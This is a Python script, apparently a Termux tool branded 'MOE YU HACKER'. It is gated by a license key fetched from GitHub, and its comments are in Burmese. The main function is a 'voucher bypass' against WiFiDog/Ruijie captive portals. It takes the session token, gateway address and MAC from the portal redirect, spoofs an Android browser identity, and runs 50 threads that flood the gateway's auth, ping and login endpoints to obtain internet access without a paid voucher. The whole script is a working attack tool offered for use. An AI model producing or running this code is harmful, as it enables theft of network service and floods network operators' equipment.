import requests
import urllib3
import time
import threading
import random
import sys
import os
import uuid
import socket
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# User ၏ Repository link ကို အသုံးပြုထားသည်
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

# ANSI COLORS FOR TERMUX
G = "\033[1;92m" 
C = "\033[1;96m" 
R = "\033[1;91m" 
Y = "\033[1;93m" 
W = "\033[0m"

BANNER = """[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      M O E   Y U   H A C K E R
[/]"""

def check_license():
    console.clear()
    console.print(Align.center(BANNER))
    # User ၏ HWID ကို ပုံသေ သတ်မှတ်ထားသည်
    console.print(Align.center(Panel(f"HWID: [yellow]KEY-90AE3B7FB9[/]", title="[red]SECURITY[/]", expand=False)))
    try:
        user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
        if not user_key: sys.exit()
        res = requests.get(KEY_URL, timeout=10).text
        if user_key in res:
            console.print(f"{G}>>> ACCESS GRANTED!{W}")
            return True
        sys.exit(f"{R}INVALID KEY!{W}")
    except: sys.exit(f"{R}CONNECTION ERROR!{W}")

# ===============================
# DEEP INJECTION BYPASS ENGINE v23.0
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU VOUCHER BYPASS (DEEP INJECTION) 🔥[/bold white]"), border_style="red", expand=False))
    
    session = requests.Session()
    # Router ကို Android ဖုန်းအစစ်ဖြစ်ကြောင်း လှည့်စားခြင်း
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    })

    while True:
        try:
            # Connectivity Check
            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if check.status_code == 204 and "ruijie" not in check.url:
                sys.stdout.write(f"\r{G}[✓] STATUS: BYPASS STABLE | ENJOY INTERNET! ✅{W}")
                sys.stdout.flush()
                time.sleep(10)
                continue

            # Token နှင့် Gateway အချက်အလက်များ ထုတ်ယူခြင်း
            portal_url = check.url
            parsed = urlparse(portal_url)
            query = parse_qs(parsed.query)
            
            sid = (query.get('token', [None])[0] or query.get('chap_challenge', [None])[0])
            gw_ip = query.get('gw_address', ['192.168.110.1'])[0]
            gw_port = query.get('gw_port', ['2060'])[0]
            mac = query.get('mac', [''])[0]

            if sid:
                # Injection Targets
                targets = [
                    f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}&mac={mac}",
                    f"http://{gw_ip}:{gw_port}/wifidog/ping?token={sid}",
                    f"http://{gw_ip}:{gw_port}/wifidog/login?token={sid}&state=1"
                ]

                def turbo_inject():
                    while True:
                        try:
                            for url in targets:
                                session.get(url, timeout=3)
                            sys.stdout.write(f"\r{C}[!] Injecting: {gw_ip} | SID: {sid[:12]}... | Active{W}")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.04)

                # Thread ပေါင်း ၅၀ ဖြင့် အရှိန်အဟုန်မြှင့် Inject လုပ်ခြင်း
                for _ in range(50):
                    threading.Thread(target=turbo_inject, daemon=True).start()

                console.print(f"\n{Y}[!] Deep Injection Active. Open Browser and click 'Login'!{W}")
                
                # အင်တာနက် အခြေအနေ စောင့်ကြည့်ခြင်း
                while True:
                    time.sleep(15)
                    try:
                        if requests.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(5)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"\r{R}[×] No Token Captured. Refresh Login Page!{W}")
                sys.stdout.flush()
                time.sleep(3)

        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    if check_license():
        start_bypass_process()
